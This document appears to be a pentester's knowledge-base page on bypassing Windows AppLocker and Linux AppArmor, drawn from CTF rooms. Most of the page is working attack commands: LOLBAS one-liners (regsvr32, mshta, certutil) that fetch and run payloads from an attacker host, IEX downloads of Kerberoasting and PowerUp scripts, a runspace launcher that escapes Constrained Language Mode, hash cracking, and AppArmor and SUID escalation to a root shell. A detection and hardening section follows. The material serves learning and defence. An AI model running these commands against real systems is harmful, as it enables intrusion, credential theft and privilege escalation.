---
title: "AppLocker & Policy Bypass"
type: technique
tags: [applocker, bypass, evasion, post-exploitation, thm, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [thm-win-corp-bypass, thm-linux-apparmor]
---

## What It Is

**AppLocker** is a Windows application control feature (available from Windows 7 Enterprise / Server 2008 R2 onward) that uses allow/deny rules to restrict which executables, scripts, Windows Installer files, packaged apps, and DLLs can run. Rules can be based on publisher (code signature), file path, or file hash. AppLocker is enforced by the Application Identity service (`AppIDSvc`).

**AppArmor** is the Linux equivalent — a Mandatory Access Control (MAC) system that confines programs via per-binary profiles, restricting file access, capabilities, and network use. Profiles operate in `enforce` mode (blocks and logs violations) or `complain` mode (logs only).

Both are defence-in-depth mechanisms, not hard security boundaries; both have well-known bypass paths.

---

## AppLocker

### What AppLocker Blocks

AppLocker can enforce rules across five rule collections:

| Rule Collection | File Types Covered |
|-----------------|-------------------|
| Executable | `.exe`, `.com` |
| Windows Installer | `.msi`, `.msp`, `.mst` |
| Script | `.ps1`, `.bat`, `.cmd`, `.vbs`, `.js` |
| DLL | `.dll`, `.ocx` (not enforced by default) |
| Packaged apps | `.appx` / MSIX |

### Querying AppLocker Policy

```powershell
# View effective AppLocker policy (all rule collections)
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# View local policy
Get-AppLockerPolicy -Local

# Test whether a file would be allowed for a specific user
Test-AppLockerPolicy -Path C:\path\to\file.exe -User domain\username
```

### Bypass: Writable Paths Allowed by Default

Many organisations deploy AppLocker with path-based rules that allow execution from `C:\Windows\*` without realising several subdirectories are writable by standard users. Writing a payload to these paths satisfies the allow rule:

```powershell
# Classic writable-but-allowed paths
C:\Windows\System32\spool\drivers\color\   # writable by Users
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
```

The THM Corp CTF used `C:\Windows\System32\spool\drivers\color` as the AppLocker bypass path.

```powershell
# Copy payload to writable allowed path and execute
copy \\attacker\share\payload.exe C:\Windows\System32\spool\drivers\color\payload.exe
C:\Windows\System32\spool\drivers\color\payload.exe
```

### Bypass: LOLBAS (Living Off the Land Binaries)

Signed Windows binaries in `C:\Windows\System32\` are typically allowed by publisher-based AppLocker rules. Many can proxy execution of arbitrary code:

| Binary | Bypass Technique |
|--------|-----------------|
| `regsvr32.exe` | `regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll` — scriptlet execution via COM, bypasses AppLocker and may bypass Script rules |
| `mshta.exe` | `mshta http://attacker/payload.hta` — executes HTA (HTML Application) files; HTA runs as a trusted application |
| `rundll32.exe` | `rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...` — executes arbitrary JS/VBS via the legacy MSHTML path |
| `wmic.exe` | `wmic process call create "C:\Windows\System32\spool\drivers\color\payload.exe"` — spawns processes through WMI |
| `certutil.exe` | `certutil -urlcache -f http://attacker/payload.exe payload.exe` — downloads files; can also decode base64 blobs to executables |
| `cscript.exe` / `wscript.exe` | May run scripts if the Script rule collection is not enforced |
| `installutil.exe` | Executes arbitrary code via a crafted `.exe` with an `[System.ComponentModel.RunInstallerAttribute]` class |
| `msbuild.exe` | Inline task execution from a `.csproj` file — compiles and runs C# at the command line |

```powershell
# regsvr32 COM scriptlet (no file on disk after execution)
regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll

# certutil download and decode
certutil -urlcache -split -f http://10.10.10.10/shell.b64 shell.b64
certutil -decode shell.b64 shell.exe

# mshta HTA payload
mshta http://10.10.10.10/payload.hta
```

### Bypass: PowerShell Constrained Language Mode (CLM)

When AppLocker Script rules are enforced, PowerShell automatically drops into **Constrained Language Mode (CLM)**, which restricts access to .NET types, COM objects, and arbitrary type casting — preventing many post-exploitation scripts from running.

**Detect CLM:**

```powershell
$ExecutionContext.SessionState.LanguageMode
# Returns: ConstrainedLanguage  (restricted)
# Returns: FullLanguage          (unrestricted)
```

**CLM Bypass — PowerShell 2.0 downgrade:**

PowerShell v2.0 does not support CLM. If `powershell -version 2` is available on the system (and `.NET 2.0/3.5` is installed), dropping to v2 bypasses CLM entirely:

```powershell
powershell -version 2
# Now in FullLanguage mode
$ExecutionContext.SessionState.LanguageMode
# Returns: FullLanguage
```

**CLM Bypass — custom PowerShell runspace:**

Compile and run a C# executable (from a writable allowed path) that hosts a PowerShell runspace without language restrictions:

```csharp
// PSBypass.cs — minimal runspace launcher
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
class Program {
    static void Main(string[] args) {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript(args[0]);
        ps.Invoke();
    }
}
```

**CLM Bypass — execution policy bypass (for script rules not enforced):**

If only execution policy (not AppLocker Script rules) blocks scripts:

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

### Post-exploitation After AppLocker Bypass (THM Corp CTF)

After placing a payload in the allowed writable path and obtaining a shell, the Corp CTF demonstrated:

**Kerberoasting** — enumerate SPNs and request service tickets:

```powershell
# Find SPNs registered in the domain
setspn -T <domain> -Q */*

# Download and run Invoke-Kerberoast (bypass execution policy first)
powershell -ep bypass
iex (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat hashcat | fl
```

```bash
# Crack the extracted hash offline
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**PowerShell history file** — often contains cleartext credentials or useful command history:

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**PowerUp privilege escalation** — enumerate misconfigured services, unquoted service paths, AlwaysInstallElevated:

```powershell
powershell -ep bypass
iex (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
Invoke-AllChecks
```

---

## AppArmor (Linux)

### Profile Enumeration

```bash
# List all loaded profiles and their mode (enforce/complain)
aa-status

# Or read the status file directly
cat /sys/kernel/security/apparmor/profiles

# View a specific profile
cat /etc/apparmor.d/<profile-name>

# Check which profile is confining the current process
cat /proc/self/attr/current
```

### How AppArmor Works

AppArmor profiles are per-binary: a profile is attached to a specific executable path (e.g., `/usr/sbin/ash`). The profile defines allowed file paths, capabilities, and network operations. If a binary has no profile, it runs **unconfined** — without any AppArmor restriction.

### AppArmor Shebang Bypass (Publisher CTF)

**Key insight:** AppArmor confines individual binaries, not scripts. A script file (`/dev/shm/pwn.sh`) has no profile of its own. If the confined shell (`/usr/sbin/ash`) executes a script, the script process inherits the shell's confinement — but if the script is executed directly with its own shebang (`#!/bin/bash`), the new process is spawned under `/bin/bash`, which may have a different (or no) profile.

In the Publisher CTF, the `think` user's shell was `/usr/sbin/ash`, which was confined by AppArmor. The profile blocked common escalation paths. Bypass:

```bash
# Write a shell script to an unconfined location
# The ash profile does NOT block /dev/shm/**
echo -e '#!/bin/bash\n/bin/bash -ip' > /dev/shm/pwn.sh
chmod 755 /dev/shm/pwn.sh

# Execute the script directly
/dev/shm/pwn.sh
# Process runs under /bin/bash (unconfined) — full LanguageMode equivalent on Linux
```

This works because:
1. `/usr/sbin/ash` is confined by an AppArmor profile.
2. `/dev/shm/pwn.sh` (and `/bin/bash`) have no AppArmor profile.
3. When the script runs, the kernel attaches the `/bin/bash` profile (none exists), so execution is unconfined.

Reference: `https://bugs.launchpad.net/apparmor/+bug/1911431`

### SUID Binary Escalation After AppArmor Bypass (Publisher CTF)

Once the AppArmor bypass produced an unconfined shell, the next step was finding a SUID root binary:

```bash
find / -type f -user root -perm /4000 2>/dev/null
```

The binary launched `/opt/run_container.sh` with root privileges. Since the script was writable (or its parent directory was), it could be modified to execute arbitrary commands as root.

**General pattern:**

```bash
# Identify the script called by a SUID binary
strings /path/to/suid-binary

# If writable, prepend a reverse shell or privilege escalation command
echo '/bin/bash -ip' >> /opt/run_container.sh

# Execute the SUID binary to trigger root execution
/path/to/suid-binary
```

---

## Detection and Defence

### AppLocker

| Detection / Hardening | Detail |
|-----------------------|--------|
| Enable AppLocker audit mode first | Run in audit-only mode to identify legitimate use before enforcing |
| Enforce DLL rule collection | Disabled by default; enabling it blocks DLL-based LOLBAS bypasses but has significant performance impact |
| Block PowerShell v2 | Remove `.NET 2.0/3.5` or use `Constrained Language Mode` enforcement via WDAC alongside AppLocker |
| Windows Defender Application Control (WDAC) | More robust than AppLocker; enforced in the kernel; not bypassable by non-admin processes |
| Restrict writable system paths | Audit `C:\Windows\` subdirectory ACLs; ensure standard users cannot write to paths covered by AppLocker allow rules |
| Script block logging | Enable PowerShell Script Block Logging (`HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`) to capture all executed script content |
| Monitor LOLBAS usage | Alert on `regsvr32`, `mshta`, `certutil`, `msbuild`, `installutil` spawning network connections or unusual child processes |

### AppArmor

| Detection / Hardening | Detail |
|-----------------------|--------|
| Enforce profiles rather than complain | `aa-enforce /etc/apparmor.d/<profile>` — complain mode logs but does not block |
| Profile all setuid/setgid binaries | Any SUID binary without a profile is a potential escalation path |
| Audit `/dev/shm` and world-writable directories | Restrict script execution from these paths in sensitive profiles |
| Log AppArmor denials | Denials appear in `/var/log/syslog` or `journalctl -xe`; alert on repeated denied operations |
| Use `aa-genprof` for new binaries | Generate a least-privilege profile for any custom application before deploying it |

---

## Sources

- TryHackMe — Corp CTF (`tryhackme.com/room/corp`): AppLocker bypass, Kerberoasting, PowerUp
- TryHackMe — Publisher (`tryhackme.com/r/room/publisher`): AppArmor shebang bypass, SUID escalation
- HackTricks AppArmor bypass reference: `book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor`
- LOLBAS project: `lolbas-project.github.io`
- Related pages: [[uac-bypass]], [[linux-privesc]], [[pass-the-hash]]

## From the Wild

### HTB — Sekhmet (2022)
- **Technique variant**: NodeJS deserialization WAF bypass, ZipCrypto KPA, AppLocker bypass
- **Attack path**: Deserialize through WAF with unicode, crack ZipCrypto, bypass AppLocker via InstallUtil.exe

### HTB — Fighter (2018)
- **Technique variant**: SQLi blacklist bypass, post-exploitation enumeration
- **Attack path**: Bypass SQL injection blacklists, chain web and post-exploitation for domain compromise
